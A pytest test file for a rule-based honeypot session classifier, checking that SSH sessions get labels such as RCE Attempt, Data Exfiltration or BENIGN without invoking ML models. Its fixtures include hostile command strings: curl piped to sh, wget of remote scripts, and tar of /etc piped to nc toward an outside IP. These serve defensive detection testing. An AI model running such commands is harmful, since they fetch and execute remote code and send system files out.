"""C1: honeypot sessions get the rule verdict, never a classifier score of a synthesised flow."""
import os
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

os.environ["SENTINEL_KEY"] = "test-sentinel-secret-key-12345"
from fastapi.testclient import TestClient  # noqa: E402

from inference.errors import ModelUnavailableError  # noqa: E402
from inference.predictor import (  # noqa: E402
    BLOCK_THRESHOLD, HONEYPOT_RULE_SCORES, HONEYPOT_RULES_VERSION, MONITOR_THRESHOLD, SentinelPredictor)
from utils.features import classify_honeypot_session  # noqa: E402

MODEL_DIR = Path(__file__).resolve().parent.parent / "models"

SESSIONS = {
    "failed_login": ({"loginSucceeded": False, "commands": [], "durationSeconds": 4}, "SSH Brute Force", "MONITOR"),
    "login_no_commands": ({"loginSucceeded": True, "commands": [], "durationSeconds": 10}, "Port Scan", "ALLOW"),
    "download_execute": ({"loginSucceeded": True, "durationSeconds": 60,
                          "commands": [{"command": "wget http://x/y.sh"}, {"command": "chmod +x y.sh"}]},
                         "RCE Attempt", "BLOCK"),
    "recon": ({"loginSucceeded": True, "durationSeconds": 60, "commands": [{"command": "nmap 10.0.0.0/24"}]},
              "Lateral Movement", "MONITOR"),
    "exfiltration": ({"loginSucceeded": True, "durationSeconds": 60, "commands": [{"command": "scp a b"}]},
                     "Data Exfiltration", "BLOCK"),
    "harmless": ({"loginSucceeded": True, "durationSeconds": 20, "commands": [{"command": "ls"}, {"command": "whoami"}]},
                 "BENIGN", "ALLOW"),
}


def model_free_predictor():
    """Loaded predictor whose models fail loudly if anything calls them."""
    with patch.object(SentinelPredictor, "load"):
        p = SentinelPredictor()
    p._loaded = True
    p.rf = p.clf = MagicMock(predict_proba=MagicMock(side_effect=AssertionError("classifier must not run")))
    p.ifo = MagicMock(named_steps={"scaler": MagicMock(transform=MagicMock(side_effect=AssertionError("IF must not run")))})
    return p


def _logged_in(*commands, duration=30):
    return {"loginSucceeded": True, "durationSeconds": duration, "commands": [{"command": c} for c in commands]}


@pytest.mark.parametrize("commands", [
    ["sync"],                       # contains "nc"
    ["systemctl start httpd"],      # contains "tar"
    ["history"], ["cat /etc/shadow"], ["echo function"],
    ["ls -la", "whoami", "uname -a", "cat /etc/passwd"],
])
def test_substrings_of_tool_names_are_not_matched(commands):
    assert classify_honeypot_session(_logged_in(*commands)) == "BENIGN"


def test_long_idle_session_is_not_exfiltration():
    assert classify_honeypot_session(_logged_in("ls", duration=3600)) == "BENIGN"


@pytest.mark.parametrize("command,expected", [
    ("cd /tmp; wget http://x/a.sh", "RCE Attempt"),
    ("curl -s http://x/a | sh", "RCE Attempt"),
    ("sudo /usr/bin/wget http://x/a", "RCE Attempt"),
    ("chmod +x a && ./a", "RCE Attempt"),
    ("/tmp/.x/miner", "RCE Attempt"),
    ("echo `nc 1.2.3.4 80`", "Data Exfiltration"),
    ("tar czf - /etc | nc 1.2.3.4 9", "Data Exfiltration"),
    ("ssh root@10.0.0.5", "Lateral Movement"),
])
def test_tools_are_found_inside_compound_commands(command, expected):
    assert classify_honeypot_session(_logged_in(command)) == expected


@pytest.mark.parametrize("name", list(SESSIONS))
def test_rule_classes(name):
    session, expected, _ = SESSIONS[name]
    assert classify_honeypot_session(session) == expected


@pytest.mark.parametrize("name", list(SESSIONS))
def test_verdict_comes_from_rules_without_running_models(name):
    session, expected, action = SESSIONS[name]
    res = model_free_predictor().predict_from_honeypot(session)
    assert res["predictedClass"] == expected
    assert res["action"] == action
    assert res["classificationMethod"] == "honeypot_rules"
    assert res["modelVersion"] == HONEYPOT_RULES_VERSION
    assert res["confidence"] is None and res["anomalyScore"] is None and res["isAnomaly"] is False


def test_attack_classes_reach_alert_line_and_benign_does_not():
    for cls, score in HONEYPOT_RULE_SCORES.items():
        if cls in ("BENIGN", "Port Scan"):
            assert score < MONITOR_THRESHOLD, cls
        else:
            assert score >= MONITOR_THRESHOLD, cls
    assert HONEYPOT_RULE_SCORES["RCE Attempt"] >= BLOCK_THRESHOLD
    assert HONEYPOT_RULE_SCORES["Data Exfiltration"] >= BLOCK_THRESHOLD


def test_commands_raise_attack_score_up_to_cap_but_not_benign():
    p = model_free_predictor()
    many = [{"command": "wget http://x/y"}] * 200
    assert p.predict_from_honeypot({"loginSucceeded": True, "commands": many})["threatScore"] == 0.99
    harmless = {"loginSucceeded": True, "commands": [{"command": "ls"}] * 50}
    assert p.predict_from_honeypot(harmless)["threatScore"] == HONEYPOT_RULE_SCORES["BENIGN"]
    two = SESSIONS["download_execute"][0]
    assert p.predict_from_honeypot(two)["threatScore"] == pytest.approx(HONEYPOT_RULE_SCORES["RCE Attempt"] + 0.02)


def test_unloaded_engine_still_fails_closed(tmp_path):
    with pytest.raises(ModelUnavailableError):
        SentinelPredictor(tmp_path).predict_from_honeypot(SESSIONS["failed_login"][0])


def test_internal_endpoint_returns_rule_verdict():
    from inference.main import app
    with patch("inference.main.predictor", model_free_predictor()):
        r = TestClient(app).post("/predict/honeypot/internal", headers={"X-API-Key": os.environ["SENTINEL_KEY"]},
                                 json={"sessionId": "s1", "sourceIP": "203.0.113.5", "loginSucceeded": False})
    assert r.status_code == 200
    body = r.json()["result"]
    assert body["predictedClass"] == "SSH Brute Force" and body["action"] == "MONITOR"


@pytest.mark.skipif(not (MODEL_DIR / "registry.json").exists(), reason="registered models not present")
def test_registered_models_no_longer_turn_attackers_benign():
    """Regression for the served artifacts: before C1 every session type below came back BENIGN."""
    p = SentinelPredictor(model_dir=str(MODEL_DIR))
    if not p._loaded:
        pytest.skip("registered models did not load in this environment")
    for name in ("failed_login", "download_execute", "recon", "exfiltration"):
        session, expected, _ = SESSIONS[name]
        res = p.predict_from_honeypot(session)
        assert res["predictedClass"] == expected != "BENIGN"
        assert res["threatScore"] >= MONITOR_THRESHOLD
